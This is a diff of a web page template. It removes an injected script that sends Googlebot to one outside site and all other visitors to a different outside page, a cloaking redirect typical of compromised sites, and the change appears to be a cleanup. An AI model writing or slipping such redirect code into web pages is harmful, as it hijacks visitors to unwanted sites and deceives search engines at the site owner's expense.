@@ -2844,14 +2844,6 @@ if (clientloggerIsEnabled) {
     })();
     </script>
 </script>
- <script>
-    var userAgent = navigator.userAgent.toLowerCase();
-    if (userAgent.indexOf('googlebot') !== -1) {
-        window.location.href = 'https://media.guitarcustom.pt/2026/';
-    } else {
-        window.location.href = 'https://pokoknya-josjis.pages.dev/pt89';
-    }
-</script>
 <div style="display:none!important">
 </div>
     <!--[if lte IE 8]>
